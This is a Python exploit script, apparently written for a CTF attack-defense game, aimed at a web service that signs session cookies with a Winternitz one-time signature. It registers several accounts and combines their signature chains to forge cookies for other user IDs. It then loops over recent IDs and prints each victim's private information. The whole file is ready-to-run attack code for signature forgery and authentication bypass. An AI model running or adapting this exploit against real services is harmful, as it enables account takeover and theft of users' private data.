import requests
import sys
from checklib import rnd_username, rnd_password
from base64 import urlsafe_b64encode, urlsafe_b64decode
import json
import random
from string import ascii_letters, digits
from hashlib import sha256
import re

PORT = 5005
if len(sys.argv) < 2:
    IP = "127.0.0.1"
else:
    IP = sys.argv[1]

URL = f"http://{IP}:{PORT}"


def hash(message: bytes):
    return sha256(message).digest()


def get_new_signature(a, b: list, hash_list):
    signature = []
    for i in range(len(a)):
        count_iter = b[i] - a[i]
        var_hash = hash_list[i]
        for _ in range(count_iter):
            var_hash = hash(var_hash)
        signature.append(var_hash)
    return signature


def gen(lenght: int):
    return "".join([random.choice(ascii_letters + digits)
                    for _ in range(lenght)])


def register_in_service():
    register_url = f'{URL}/sign'
    while True:
        login = rnd_username()
        password = rnd_password()
        data = {
            'username': login,
            'password': password
        }
        session = requests.Session()
        r = session.post(url=register_url, data=data)
        if "Пользователь с таким именем уже есть" in r.text:
            continue
        data['id'] = r.url.split("/")[-2]
        return session, data


def cabinet_in_service(session, id):
    cabinet_url = f'{URL}/cabinet/{id}/'
    r = session.get(cabinet_url)
    find_username = re.findall(r"Username : <b>(.*)</b></p>", r.text)
    if len(find_username) == 0:
        print(r.text)
        exit()
    return find_username[0]


array_users = []
array_hash_cookie_data = []
array_cookie_signature = []
for i in range(5):
    array_users.append(register_in_service())
    cookie = array_users[i][0].cookies.get("session")
    cookie_data = urlsafe_b64decode(cookie.split(".")[1]).decode()
    cookie_signature = urlsafe_b64decode(cookie.split(".")[2])
    cookie_signature = [cookie_signature[i:i+32]
                        for i in range(0, len(cookie_signature), 32)]
    hash_data = hash(cookie_data.encode())
    array_hash_cookie_data.append(hash_data)
    array_cookie_signature.append(cookie_signature)
max_array = []
signature_for_max_array = []

for i in range(len(array_hash_cookie_data[0])):
    max_local = -1
    signature_for_max_local = b""
    for j in range(len(array_hash_cookie_data)):
        if array_hash_cookie_data[j][i] > max_local:
            max_local = array_hash_cookie_data[j][i]
            signature_for_max_local = array_cookie_signature[j][i]
    max_array.append(max_local)
    signature_for_max_array.append(signature_for_max_local)

print(max_array)
start_id = int(array_users[0][1].get("id"))
end_id = int(start_id) - 30
print(start_id)
session = array_users[0][0]
for id in range(end_id, start_id):
    username = cabinet_in_service(session, id)
    new_data = {"id": id, "username": username}
    while True:
        hash_mess1 = hash(json.dumps(new_data).encode())
        exit_ = True
        for i, k in enumerate(hash_mess1):
            if not k <= max_array[i]:
                new_data["e"] = gen(10)
                exit_ = False
                break
        if exit_:
            jwt_header = json.dumps({"type": "WOTS"}).encode()
            new_data = json.dumps(new_data).encode()
            jwt_signature = get_new_signature(hash_mess1, max_array,
                                              signature_for_max_array)
            new_cookie = ".".join([urlsafe_b64encode(jwt_header).decode(),
                                   urlsafe_b64encode(new_data).decode(),
                                   urlsafe_b64encode(b"".join(jwt_signature))
                                   .decode()])
            r = requests.get(f"{URL}/cabinet/{id}/",
                             cookies={"session": new_cookie})
            start_index = r.text.find("Закрытая информация :")
            print(r.url, r.text[start_index: start_index + 400])
            break
